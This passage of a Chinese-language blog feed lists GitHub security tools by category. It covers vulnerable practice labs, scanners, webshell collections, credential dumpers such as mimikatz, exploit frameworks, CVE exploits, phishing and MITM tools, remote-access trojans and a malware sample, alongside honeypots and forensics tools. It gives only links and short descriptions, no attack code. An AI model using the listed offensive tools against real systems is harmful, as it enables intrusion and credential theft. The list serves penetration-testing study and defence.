href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
]]></content>
      <categories>
        <category>工具手册</category>
      </categories>
      <tags>
        <tag>工具手册</tag>
      </tags>
  </entry>
  <entry>
    <title>github渗透测试工具集-转</title>
    <url>/posts/a25c6c18/</url>
    <content><![CDATA[<p>转自: <a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247487430&amp;idx=1&amp;sn=d1a0ecdbe455d068804d540c12d4070b&amp;source=41#wechat_redirect</a></p>
<h1 id="漏洞练习平台"><a href="#漏洞练习平台" class="headerlink" title="漏洞练习平台"></a>漏洞练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br>webgoat-legacy漏洞练习平台:<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a><br>zvuldirll漏洞练习平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>vulapps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>用node编写的漏洞练习平台，like OWASP NodeGoat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，生成含漏洞的虚拟机：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a></p>
<h1 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>本地网络扫描器：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>子域名扫描器：<br><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>linux漏洞扫描：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>漏洞路由扫描器：<br><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a><br>迷你批量信息泄漏扫描脚本：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>Waf类型检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>服务器端口弱口令扫描器：<br><a href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a><br>Fox-scan扫描器：<br><a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a><br>信息搜集工具</p>
<h1 id="社工收集器："><a href="#社工收集器：" class="headerlink" title="社工收集器："></a>社工收集器：</h1><p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>Github信息搜集：<br><a href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a><br>github Repo信息搜集工具：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>信息探测及扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>内部网络信息扫描器：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>远程桌面登录扫描器：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透工具<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>SNMAP密码破解:<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>webshell大合集：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>渗透以及web攻击脚本：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>web渗透小工具大合集：<br><a href="https://github.com/rootphantomer/hacktoolsfor_me">https://github.com/rootphantomer/hacktoolsfor_me</a><br>XSS数据接收平台：<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a><br>XSS与CSRF工具：<br><a href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a><br>xss多功能扫描器：<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>web漏洞扫描器:<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>WEB漏洞扫描器：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>渗透常用小工具包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>web目录扫描器:<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>web向命令注入检测工具：<br><a href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a><br>自动化SQL注入检查工具：<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>SSL扫描器：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>安全工具集合：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>apache日志分析器：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>php代码审计工具：<br><a href="https://github.com/pwnsdx/BadCode">https://github.com/pwnsdx/BadCode</a><br>web指纹识别扫描：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>检查网站恶意攻击：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>wordprees漏洞扫描器：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>固件漏洞扫描器：<br><a href="https://github.com/misterch0c/firminator_backend">https://github.com/misterch0c/firminator_backend</a><br>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>Web代理：<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>新版中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a><br>git泄露利用EXP：<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>浏览器攻击框架：<br><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a><br>自动化绕过WAF脚本：<br><a href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser">https://github.com/owtf/wafbypasser</a><br>一款开源WAF：<br><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a><br>http命令行客户端：<br><a href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a><br>浏览器调试利器：<br><a href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a><br>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>自动化代码审计工具<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>浏览器攻击框架：<br><a href="https://github.com/julienbedard/browsersploit">https://github.com/julienbedard/browsersploit</a><br>tomcat自动后门部署：<br><a href="https://github.com/mgeeky/tomcatWarDeployer">https://github.com/mgeeky/tomcatWarDeployer</a><br>网络空间指纹扫描器：<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>burpsuit之J2EE扫描插件：<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a></p>
<h1 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h1><p>mimikatz明文注入：<br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>Powershell渗透库合集：<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>Powershell tools合集：<br><a href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a><br>powershell的mimikittenz:<br><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a><br>域渗透教程:<br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web向Fuzz工具<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>HTTP暴力破解，撞库攻击脚本<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p>
<h1 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h1><p>msf框架：<br><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a><br>pocsscan攻击框架：<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>Pocsuite攻击框架:<br><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a><br>Beebeeto攻击框架：<br><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a><br>漏洞POC&amp;EXP:<br>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a><br>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a><br>CVE-2016-2107:<br><a href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a><br>CVE-2015-7547 POC：<br><a href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a><br>JAVA反序列化POC生成工具:<br><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>JAVA反序列化EXP:<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a><br>Jenkins CommonCollections EXP:<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a><br>CVE-2015-2426 EXP (windows内核提权):<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a><br>use docker to show web attack(php本地文件包含结合phpinfo<br>getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a><br>php7缓存覆写漏洞Demo及相关工具:<br><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a><br>XcodeGhost木马样本:<br><a href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
<h1 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h1><p>中间人攻击框架:<br><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a><br>Inject code, jam wifi, and spy on wifi users:<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>中间人代理工具:<br><a href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a><br>wifi钓鱼:<br><a href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p>
<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>本地存储的各类密码提取利器:<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
<h1 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h1><p>二进制分析工具<br><a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a><br>系统扫描器<br><a href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a><br>rp:<br><a href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a><br>Windows Exploit Development工具<br><a href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a><br>二进制静态分析工具（python）:<br><a href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a><br>Python Exploit Development Assistance for GDB:<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a><br>对BillGates Linux Botnet系木马活动的监控工具<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a><br>木马配置参数提取工具:<br><a href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a><br>Shellphish编写的二进制分析工具（CTF向）:<br><a href="https://github.com/angr/angr">https://github.com/angr/angr</a><br>针对python的静态代码分析工具:<br><a href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a><br>一个自动化的脚本（shell）分析工具，用来给出警告和建议:<br><a href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a><br>基于AST变换的简易Javascript反混淆辅助工具:<br><a href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p>
<h1 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h1><p>二进制EXP编写工具:<br><a href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a><br>CTF Pwn 类题目脚本编写框架:<br><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a><br>an easy-to-use io library for pwning development:<br><a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a><br>跨平台注入工具:<br><a href="https://github.com/frida/frida">https://github.com/frida/frida</a><br>哈希长度扩展攻击EXP：<br><a href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a></p>
<h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><p>隐写检测工具<br><a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p>
<h1 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料:"></a>各类安全资料:</h1><p>data_hacking合集:<br><a href="https://github.com/ClickSecurity/data_hacking">https://github.com/ClickSecurity/data_hacking</a><br>mobile-security-wiki:<br><a href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a><br>书籍《reverse-engineering-for-beginners》:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a><br>一些信息安全标准及设备配置:<br><a href="https://github.com/luyg24/IT_security">https://github.com/luyg24/IT_security</a><br>APT相关笔记:<br><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a><br>Kcon资料:<br><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a><br>《DO NOT FUCK WITH A HACKER》:<br><a href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a><br>各类安全脑洞图：<br><a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a><br>信息安全流程图：<br><a href="https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p>
<h1 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h1><p>近年ctf writeup大全:<br><a href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a><br>fbctf竞赛平台Demo:<br><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a><br>ctf Resources:<br><a href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a><br>ctf及黑客资源合集:<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a><br>ctf和安全工具大合集:<br><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a><br>ctf向 python工具包<br><a href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p>
<h1 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h1><p> 大礼包（什么都有）:<br><a href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a><br>bash-handbook:<br><a href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a><br>python资源大全:<br><a href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a><br>git学习资料:<br><a href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a><br>安卓开源代码解析<br><a href="https://github.com/android-cn/android-open-project">https://github.com/android-cn/android-open-project</a><br>python框架，库，资源大合集:<br><a href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a><br>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:<br><a href="https://github.com/VerbalExpressions/">https://github.com/VerbalExpressions/</a><br>python任务管理以及命令执行库:<br><a href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a><br>python exe打包库:<br><a href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a><br>Veil-Evasion免杀项目：<br><a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a><br>py3 爬虫框架:<br><a href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a><br>一个提供底层接口数据包编程和网络协议支持的python库:<br><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a><br>python requests 库:<br><a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a><br>python 实用工具合集:<br><a href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a><br>python爬虫系统:<br><a href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p>
<h1 id="福利"><a href="#福利" class="headerlink" title="福利"></a>福利</h1><p>微信自动抢红包动态库<br><a href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a><br>微信抢红包插件（安卓版）<br><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a><br>hardsed神器:<br><a href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p>
<h1 id="甲方安全工程师生存指南"><a href="#甲方安全工程师生存指南" class="headerlink" title="甲方安全工程师生存指南"></a>甲方安全工程师生存指南</h1><p>web索引及日志搜索工具：<br><a href="https://github.com/thomaspatzke/WASE">https://github.com/thomaspatzke/WASE</a><br>开源日志采集器：<br><a href="https://github.com/wgliang/logcool">https://github.com/wgliang/logcool</a><br>扫描CS结构的web debuger<br><a href="https://github.com/Kozea/wdb">https://github.com/Kozea/wdb</a><br>恢复sqlite数据库删除注册信息：<br><a href="https://github.com/aramosf/recoversqlite/">https://github.com/aramosf/recoversqlite/</a><br>gps欺骗检测工具:<br><a href="https://github.com/zxsecurity/gpsnitch">https://github.com/zxsecurity/gpsnitch</a><br>应急处置响应框架:<br><a href="https://github.com/biggiesmallsAG/nightHawkResponse">https://github.com/biggiesmallsAG/nightHawkResponse</a><br>web安全开发指南:<br><a href="https://github.com/FallibleInc/security-guide-for-developers">https://github.com/FallibleInc/security-guide-for-developers</a><br>各个知名厂商漏洞测试报告模板：<br><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a><br>linux下恶意代码检测包：<br><a href="https://github.com/rfxn/linux-malware-detect">https://github.com/rfxn/linux-malware-detect</a><br>操作系统运行指标可视化框架：<br><a href="https://github.com/facebook/osquery">https://github.com/facebook/osquery</a><br>恶意代码分析系统：<br><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a><br>定期搜索及存储web应用：<br><a href="https://github.com/Netflix/Scumblr">https://github.com/Netflix/Scumblr</a><br>事件响应框架：<br><a href="https://github.com/google/grr">https://github.com/google/grr</a><br>综合主机监控检测平台：<br><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a><br>分布式实时数字取证系统：<br><a href="https://github.com/mozilla/mig">https://github.com/mozilla/mig</a><br>Microsoft &amp; Unix 文件系统及硬盘取证工具：<br><a href="https://github.com/sleuthkit/sleuthkit">https://github.com/sleuthkit/sleuthkit</a></p>
<h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><p>SSH蜜罐：<br><a href="https://github.com/desaster/kippo">https://github.com/desaster/kippo</a><br>蜜罐集合资源：<br><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a><br>kippo进阶版蜜罐：<br><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a><br>SMTP 蜜罐：<br><a href="https://github.com/awhitehatter/mailoney">https://github.com/awhitehatter/mailoney</a><br>web应用程序蜜罐：<br><a href="https://github.com/mushorg/glastopf">https://github.com/mushorg/glastopf</a><br>数据库蜜罐：<br><a href="https://github.com/jordan-wright/elastichoney">https://github.com/jordan-wright/elastichoney</a><br>web蜜罐：<br><a href="https://github.com/atiger77/Dionaea">https://github.com/atiger77/Dionaea</a></p>
<h1 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h1><p>用gmail充当C&amp;C服务器的后门<br><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a><br>开源的远控：<br><a href="https://github.com/UbbeLoL/uRAT">https://github.com/UbbeLoL/uRAT</a><br>c#远控：<br><a href="https://github.com/hussein-aitlahcen/BlackHole">https://github.com/hussein-aitlahcen/BlackHole</a></p>
<h1 id="工具合集"><a href="#工具合集" class="headerlink" title="工具合集"></a>工具合集</h1><p><a href="https://github.com/torque59/Nosql-Exploitation-Framework">https://github.com/torque59/Nosql-Exploitation-Framework</a></p>
<p>(NoSQL扫描/爆破工具)<br><a href="https://github.com/missDronio/blindy">https://github.com/missDronio/blindy</a><br>(MySQL盲注爆破工具)<br><a href="https://github.com/fengxuangit/Fox-scan">https://github.com/fengxuangit/Fox-scan</a><br>(基于SQLMAP的主动和被动资源发现的漏洞扫描工具)<br><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a><br>(用于SQL Server审计的powershell脚本)<br><a href="https://github.com/JohnTroony/Blisqy">https://github.com/JohnTroony/Blisqy</a><br>(用于http header中的时间盲注爆破工具，仅针对MySQL / MariaDB)<br><a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a><br>(Java编写的SQL注入工具)<br><a href="https://github.com/Hadesy2k/sqliv">https://github.com/Hadesy2k/sqliv</a><br>(基于搜索引擎的批量SQL注入漏洞扫描器)<br><a href="https://github.com/s0md3v/sqlmate">https://github.com/s0md3v/sqlmate</a><br>(在sqlmap基础上增加了目录扫描，hash爆破等功能)<br><a href="https://github.com/m8r0wn/enumdb">https://github.com/m8r0wn/enumdb</a><br>(Mysys以及MSSQL爆破脱裤工具)<br><a href="https://github.com/9tail123/wooscan">https://github.com/9tail123/wooscan</a><br>(批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试)<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>(一个简单的HTTP暴力破解，撞库攻击脚本)<br><a href="https://github.com/ysrc/F-Scrack">https://github.com/ysrc/F-Scrack</a><br>(对各类服务进行弱口令检测的脚本)<br><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a><br>(根据用户习惯生成弱口令探测字典脚本)<br><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a><br>(Go写的协程版的ssh \redis \ mongodb弱口令破解工具)<br><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a><br>(暴力破解字典建立工具)<br><a href="https://github.com/shengqi158/weak_password_detect">https://github.com/shengqi158/weak_password_detect</a><br>(多线程探测弱口令)<br><a href="https://github.com/s0md3v/Blazy">https://github.com/s0md3v/Blazy</a><br>(支持测试CSRF，Clickjacking，Cloudflare和WAF的弱口令探测器)<br><a href="https://github.com/MooseDojo/myBFF">https://github.com/MooseDojo/myBFF</a><br>(对CiscoVPN，Citrix Gateway等各类服务进行弱口令检测的脚本)<br><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a><br>(物联网设备默认密码扫描检测工具)<br><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a><br>(使用nmap扫描IoT设备)<br><a href="https://github.com/googleinurl/RouterHunterBR">https://github.com/googleinurl/RouterHunterBR</a><br>(路由器设备漏洞扫描利用)<br><a href="https://github.com/scu-igroup/telnet-scanner">https://github.com/scu-igroup/telnet-scanner</a><br>(Telnet服务密码撞库)<br><a href="https://github.com/viraintel/OWASP-Nettacker">https://github.com/viraintel/OWASP-Nettacker</a><br>(自动化信息搜集及渗透测试工具，比较适用于IoT扫描)<br><a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a><br>(嵌入式设备漏洞扫描及利用工具)<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>(一款XSS扫描器，可暴力注入参数)<br><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a><br>(小型XSS扫描器，也可检测CRLF，XSS，点击劫持的)<br><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a><br>(PHP版本的反射型xss扫描)<br><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a><br>(批量扫描XSS的python脚本)<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a><br>(自动化检测页面是否存在XSS和跨站请求伪造漏洞的浏览器插件)<br><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a><br>(使用命令行进行XSS批量检测)<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>(可识别和绕过WAF的XSS扫描工具)<br><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a><br>(支持GET，POST方式的高效XSS扫描器)<br><a 